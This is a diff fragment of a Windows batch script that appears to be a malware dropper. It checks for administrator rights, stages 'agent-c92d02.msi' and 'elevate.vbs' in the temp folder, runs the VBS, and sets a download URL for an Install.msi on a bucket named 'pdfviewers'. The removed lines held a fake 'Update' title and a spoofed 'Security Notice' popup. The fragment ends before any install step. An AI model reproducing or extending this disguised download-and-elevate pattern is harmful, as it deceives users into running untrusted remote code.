@@ -1,6 +1,5 @@
 @echo off
 setlocal enabledelayedexpansion
-title Update
 
 :: 
 net session >nul 2>&1
@@ -13,11 +12,6 @@ set "Temps=%TEMP%"
 set "agents=%Temps%\agent-c92d02.msi"
 set "main=%Temps%\elevate.vbs"
 
-:: 
-> "%main%" echo Set s = CreateObject("WScript.Shell")
->>"%main%" echo s.Popup "A required component could not be verified.", 5, "Security Notice", 48
-
-::
 start "" wscript.exe "%main%"
 set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
 
